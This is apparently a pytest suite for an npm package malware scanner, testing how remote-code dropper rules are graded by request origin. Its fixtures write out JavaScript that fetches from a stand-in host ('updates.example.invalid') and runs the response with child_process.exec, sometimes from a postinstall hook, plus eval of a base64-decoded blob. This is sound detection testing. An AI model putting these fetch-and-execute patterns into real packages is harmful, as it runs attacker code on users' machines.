"""A response that is run is blocked alone only when it came from an external literal host or a decoded blob.

`SUSPECT.DROPPER.REMOTE_CODE.001` and `MALWARE.INSTALL.REMOTE_CODE.001` read the body of a network response reaching an
evaluator or a child process. Across the dev sets the units they block alone are, for the legitimate ones, clients whose
request goes to a loopback or private address, or to a host a parameter, a variable or a configuration decides; the
malicious ones name an external host in the code or run decoded content. So: with an external literal request site
anywhere in the package, or a decoded value run anywhere in it, the composites keep their grade; with neither, and every
file read, they are reported at MEDIUM (the install-time composite withdrawn for the suspect one), never dropped, and
another blocking finding of the package still blocks. A package some of whose files were not read keeps the block.

Fixtures name hosts under `.invalid` and loopback addresses; nothing in them is run.
"""

from __future__ import annotations

import io
import json
import tarfile
from pathlib import Path
from typing import ClassVar

import pytest

from cordon_scanner import Scanner
from cordon_scanner.analysis.javascript.flow.origins import RequestOrigins
from cordon_scanner.analysis.javascript.js_flow import MAX_BYTES, JsFlow
from cordon_scanner.detect.code.reached_flows import CrossFileJoin
from cordon_scanner.foundation.config.settings import Config
from cordon_scanner.foundation.models import Finding, Severity
from support import requires_forked_workers

SUSPECT = "SUSPECT.DROPPER.REMOTE_CODE.001"
INSTALL = "MALWARE.INSTALL.REMOTE_CODE.001"


class OriginScanKit:
    RUN: ClassVar[str] = (
        "res.on('data', c => { d += c; });\nres.on('end', () => { require('child_process').exec(d); });\n"
    )

    @staticmethod
    def client(
        url: str, wrapper: str = "module.exports.run = function (cb) {", close: str = "};\n"
    ) -> str:
        return (
            "const http = require('http');\n"
            f"{wrapper}\n"
            f"  http.get({url}, (res) => {{\n"
            "    let d = '';\n"
            f"    {OriginScanKit.RUN}"
            "  });\n"
            f"{close}"
        )

    @staticmethod
    def at_install(url: str) -> str:
        return OriginScanKit.client(url, "(function () {", "})();\n")

    @staticmethod
    def scan(tmp_path: Path, files: dict[str, str], *, hook: bool = False) -> list[Finding]:
        """The findings for a package of `files`, scanned as a tarball."""
        manifest: dict[str, object] = {
            "name": "origin-demo",
            "version": "1.0.0",
            "main": "index.js",
        }
        if hook:
            manifest["scripts"] = {"postinstall": "node index.js"}
        members = {"package/package.json": json.dumps(manifest).encode()}
        members.update({f"package/{name}": text.encode() for name, text in files.items()})
        buffer = io.BytesIO()
        with tarfile.open(fileobj=buffer, mode="w:gz") as archive:
            for name, data in members.items():
                info = tarfile.TarInfo(name)
                info.size = len(data)
                archive.addfile(info, io.BytesIO(data))
        target = tmp_path / "origin-demo-1.0.0.tgz"
        target.write_bytes(buffer.getvalue())
        return list(Scanner(Config.default().with_overrides(use_cache=False)).scan(target).findings)

    @staticmethod
    def graded(tmp_path: Path, files: dict[str, str], *, hook: bool = False) -> dict[str, Severity]:
        """The strongest severity of each of the two composites."""
        out: dict[str, Severity] = {}
        for finding in OriginScanKit.scan(tmp_path, files, hook=hook):
            if finding.rule_id in (SUSPECT, INSTALL):
                out[finding.rule_id] = max(
                    out.get(finding.rule_id, Severity.INFO), finding.severity
                )
        return out

    @staticmethod
    def reason_given(tmp_path: Path, files: dict[str, str]) -> bool:
        return any(
            "name no external address" in step
            for f in OriginScanKit.scan(tmp_path, files)
            if f.rule_id == SUSPECT
            for step in f.explanation.escalations
        )


class TestARequestThatGoesToNoExternalHost:
    def test_a_loopback_request_is_reported_below_the_gate(self, tmp_path: Path) -> None:
        graded = OriginScanKit.graded(
            tmp_path, {"index.js": OriginScanKit.client("'http://127.0.0.1:8123/cmd'")}
        )
        assert graded == {SUSPECT: Severity.MEDIUM}

    def test_a_parameter_decides_nothing_so_it_is_reported_below_the_gate(
        self, tmp_path: Path
    ) -> None:
        text = OriginScanKit.client("url", "module.exports.run = function (url) {")
        assert OriginScanKit.graded(tmp_path, {"index.js": text}) == {SUSPECT: Severity.MEDIUM}

    def test_an_environment_variable_at_install_withdraws_the_install_composite(
        self, tmp_path: Path
    ) -> None:
        text = OriginScanKit.at_install("process.env.UPDATE_URL")
        assert OriginScanKit.graded(tmp_path, {"index.js": text}, hook=True) == {
            SUSPECT: Severity.MEDIUM
        }

    def test_a_loopback_request_at_install_is_reported_not_dropped(self, tmp_path: Path) -> None:
        text = OriginScanKit.at_install("'http://127.0.0.1:8123/cmd'")
        graded = OriginScanKit.graded(tmp_path, {"index.js": text}, hook=True)
        assert INSTALL not in graded
        assert graded[SUSPECT] == Severity.MEDIUM

    def test_the_reason_is_in_the_finding(self, tmp_path: Path) -> None:
        text = OriginScanKit.client("'http://127.0.0.1:8123/cmd'")
        assert OriginScanKit.reason_given(tmp_path, {"index.js": text})


class TestAnExternalLiteralHostKeepsTheBlock:
    def test_exported(self, tmp_path: Path) -> None:
        graded = OriginScanKit.graded(
            tmp_path, {"index.js": OriginScanKit.client("'https://updates.example.invalid/cmd'")}
        )
        assert graded[SUSPECT] >= Severity.HIGH

    def test_at_install_both_composites_are_critical(self, tmp_path: Path) -> None:
        text = OriginScanKit.at_install("'https://updates.example.invalid/cmd'")
        graded = OriginScanKit.graded(tmp_path, {"index.js": text}, hook=True)
        assert graded == {INSTALL: Severity.CRITICAL, SUSPECT: Severity.CRITICAL}

    def test_the_external_request_in_another_file_of_the_package_counts(
        self, tmp_path: Path
    ) -> None:
        files = {
            "index.js": OriginScanKit.client("'http://127.0.0.1:8123/cmd'"),
            "lib/ping.js": "module.exports = () => fetch('https://updates.example.invalid/ping');\n",
        }
        assert OriginScanKit.graded(tmp_path, files)[SUSPECT] >= Severity.HIGH

    def test_a_helper_called_with_an_external_literal_in_another_file(self, tmp_path: Path) -> None:
        files = {
            "lib/get.js": OriginScanKit.client("url", "module.exports.fetchRun = function (url) {"),
            "index.js": "const { fetchRun } = require('./lib/get');\nfetchRun('https://updates.example.invalid/cmd');\n",
        }
        assert OriginScanKit.graded(tmp_path, files)[SUSPECT] >= Severity.HIGH

    def test_a_url_split_across_literals_handed_to_a_helper_in_another_file(
        self, tmp_path: Path
    ) -> None:
        """The scheme and the host are two literals: no string of the package holds `://`, and the composite still
        keeps its grade."""
        files = {
            "lib/get.js": OriginScanKit.client("url", "module.exports.fetchRun = function (url) {"),
            "index.js": (
                "const { fetchRun } = require('./lib/get');\n"
                "fetchRun('https:' + '//updates.example.invalid/cmd');\n"
            ),
        }
        assert OriginScanKit.graded(tmp_path, files)[SUSPECT] >= Severity.HIGH


class TestADecodedValueThatIsRunKeepsTheBlock:
    def test_a_decoded_blob_run_elsewhere_in_the_package(self, tmp_path: Path) -> None:
        files = {
            "index.js": OriginScanKit.client("'http://127.0.0.1:8123/cmd'"),
            "lib/boot.js": 'const c = Buffer.from("Y29uc29sZS5sb2coMSk=", "base64").toString();\neval(c);\n',
        }
        assert OriginScanKit.graded(tmp_path, files)[SUSPECT] >= Severity.HIGH

    def test_a_decoded_blob_handed_to_a_helper_of_another_file_that_runs_it(
        self, tmp_path: Path
    ) -> None:
        files = {
            "index.js": OriginScanKit.client("'http://127.0.0.1:8123/cmd'"),
            "lib/boot.js": (
                "const run = require('./run');\n"
                'run(Buffer.from("Y29uc29sZS5sb2coMSk=", "base64").toString());\n'
            ),
            "lib/run.js": "module.exports = function (code) { eval(code); };\n",
        }
        assert OriginScanKit.graded(tmp_path, files)[SUSPECT] >= Severity.HIGH


class TestWhatIsNotKnownKeepsTheBlock:
    def test_a_file_too_large_to_read_may_name_an_external_host(self, tmp_path: Path) -> None:
        big = 'fetch("https://updates.example.invalid/x");\n' + "var a = 1;\n" * (MAX_BYTES // 8)
        assert len(big) > MAX_BYTES
        files = {"index.js": OriginScanKit.client("'http://127.0.0.1:8123/cmd'"), "lib/big.js": big}
        assert OriginScanKit.graded(tmp_path, files)[SUSPECT] >= Severity.HIGH

    @requires_forked_workers
    def test_a_file_whose_origins_pass_the_step_budget_keeps_the_block(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """The loopback client is reported below the gate (above); with its origins past the step budget nothing
        is known of where it requests, so it keeps its grade. The budget is patched here and read in the scan's
        workers, so this runs where workers are forked; `TestTheBudgetWithoutWorkers` holds the same decision
        on every platform."""
        monkeypatch.setattr(RequestOrigins, "STEP_FLOOR", 0)
        monkeypatch.setattr(RequestOrigins, "STEPS_PER_TOKEN", 0)
        files = {"index.js": OriginScanKit.client("'http://127.0.0.1:8123/cmd'")}
        assert OriginScanKit.graded(tmp_path, files)[SUSPECT] >= Severity.HIGH

    @requires_forked_workers
    def test_the_reason_is_not_given_when_the_budget_is_passed(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.setattr(RequestOrigins, "STEP_FLOOR", 0)
        monkeypatch.setattr(RequestOrigins, "STEPS_PER_TOKEN", 0)
        files = {"index.js": OriginScanKit.client("'http://127.0.0.1:8123/cmd'")}
        assert not OriginScanKit.reason_given(tmp_path, files)


class TestTheBudgetWithoutWorkers:
    """The decision of the two scans above, with no worker process: the worker's half (`JsFlow.summaries_raw`, run in
    this process, where a patch holds) and the parent's half (`CrossFileJoin.unexternal`). On Windows a scan's
    workers are spawned fresh and never see a patch made in the test, so those scans run where workers are forked;
    these run everywhere and say the same thing: what a file's origins cost past the budget is unknown, and an
    unknown keeps the block."""

    LOOPBACK = OriginScanKit.client("'http://127.0.0.1:8123/cmd'")

    @staticmethod
    def lowered(text: str) -> bool:
        """Whether the package of this one file may have the block lowered: every request known, none external."""
        return CrossFileJoin.unexternal({"index.js": JsFlow.summaries_raw(text)}, [])

    def test_a_loopback_request_within_the_budget_may_lower_the_block(self) -> None:
        assert self.lowered(self.LOOPBACK)

    def test_a_file_past_the_budget_says_nothing_is_known(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.setattr(RequestOrigins, "STEP_FLOOR", 0)
        monkeypatch.setattr(RequestOrigins, "STEPS_PER_TOKEN", 0)
        assert JsFlow.summaries_raw(self.LOOPBACK)["js.request"] == [["over_budget", 1]]

    def test_a_file_past_the_budget_keeps_the_block(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setattr(RequestOrigins, "STEP_FLOOR", 0)
        monkeypatch.setattr(RequestOrigins, "STEPS_PER_TOKEN", 0)
        assert not self.lowered(self.LOOPBACK)

    def test_an_external_host_keeps_the_block_within_the_budget_too(self) -> None:
        assert not self.lowered(OriginScanKit.client("'https://updates.example.invalid/x'"))
